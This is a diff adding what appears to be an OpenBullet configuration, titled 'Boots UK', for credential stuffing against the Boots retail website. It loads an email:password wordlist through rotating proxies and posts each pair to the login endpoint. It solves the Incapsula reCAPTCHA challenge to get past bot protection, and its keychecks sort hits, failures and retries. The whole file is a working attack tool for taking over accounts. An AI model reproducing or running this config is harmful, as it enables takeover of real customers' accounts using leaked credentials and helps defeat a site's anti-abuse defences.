@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Boots UK",
+  "SuggestedBots": 20,
+  "LastModified": "2018-06-05T14:00:24.3937843+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 3,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#FIST_GET REQUEST GET "http://www.boots.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, image/apng, */*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Log in/register" 
+#SECOND_GET REQUEST GET "https://www.boots.com/webapp/wcs/stores/servlet/BootsLogonForm?catalogId=28501&myAcctMain=1&langId=-1&storeId=11352&krypto=N1wCrExuu1%2BGmtjdCnUeUsyvLEUGy63unIWrEk38Ztzh2k1uZaIzoGXC9HnAYEgFuceqZ05Or42umU3nKhS30UWayeWQvPIuIiCCqCyVxxqAOZ3lvCoHi%2B35gU8HvSnOiMVr4IBJn4xxfltCcWy6DHQJnd835BlBZbyZqBQ2dVGzRqayVAA%2FkuhdCjZkh3NZ" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, image/apng, */*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Forgotten your password?" 
+#POST REQUEST POST "https://www.boots.com/LoginRequestDispatcher" AutoRedirect=TRUE 
+  CONTENT "storeId=11352&catalogId=28501&reLogonURL=LogonForm&myAcctMain=&fromOrderId=*&toOrderId=.&deleteIfEmpty=*&continue=1&createIfEmpty=1&calculationUsageId=-1&updatePrices=0&errorViewName=AjaxOrderItemDisplayView&previousPage=logon&returnPage=&dispatch_logon=&URL=OrderItemMove%3Fpage%3D%26URL%3DOrderCalculate%253FURL%253Dhttps%3A%2F%2Fwww.boots.com%2FAjaxLogonForm%26calculationUsageId%3D-1%26calculationUsageId%3D-2%26calculationUsageId%3D-7%26deleteCartCookie%3Dtrue&logonId=<USER>&logonPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, image/apng, */*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.boots.com/webapp/wcs/stores/servlet/BootsLogonForm" 
+#PARSE_CAPTCHA_URL PARSE "<SOURCE>" LR "<iframe src=\"" "\"" Recursive=FALSE -> VAR "URL" "" "" 
+IF "<URL>" DoesNotContain "_Incapsula_Resource"
+JUMP #POST2
+ENDIF
+
+#ASKING_CAPTCHA_KEY REQUEST GET "http://www.boots.com<URL>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://www.boots.com/LoginRequestDispatcher" "6Ld38BkUAAAAAPATwit3FXvga1PI6iVTb6zgXw62" -> VAR "RECAP" 
+#CAPTCHA_SOLVING REQUEST POST "https://www.boots.com/_Incapsula_Resource?SWCGHOEL=v2" AutoRedirect=TRUE 
+  CONTENT "g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST2 REQUEST POST "https://www.boots.com/LoginRequestDispatcher" AutoRedirect=TRUE 
+  CONTENT "storeId=11352&catalogId=28501&reLogonURL=LogonForm&myAcctMain=&fromOrderId=*&toOrderId=.&deleteIfEmpty=*&continue=1&createIfEmpty=1&calculationUsageId=-1&updatePrices=0&errorViewName=AjaxOrderItemDisplayView&previousPage=logon&returnPage=&dispatch_logon=&URL=OrderItemMove%3Fpage%3D%26URL%3DOrderCalculate%253FURL%253Dhttps%3A%2F%2Fwww.boots.com%2FAjaxLogonForm%26calculationUsageId%3D-1%26calculationUsageId%3D-2%26calculationUsageId%3D-7%26deleteCartCookie%3Dtrue&logonId=<USER>&logonPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, image/apng, */*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "MyAccountDisplay.jsp" 
+  KEYCHAIN Failure OR 
+    KEY "The email address and/or password you entered has not been recognised" 
+  KEYCHAIN Retry OR 
+    KEY "Incapsula incident" 
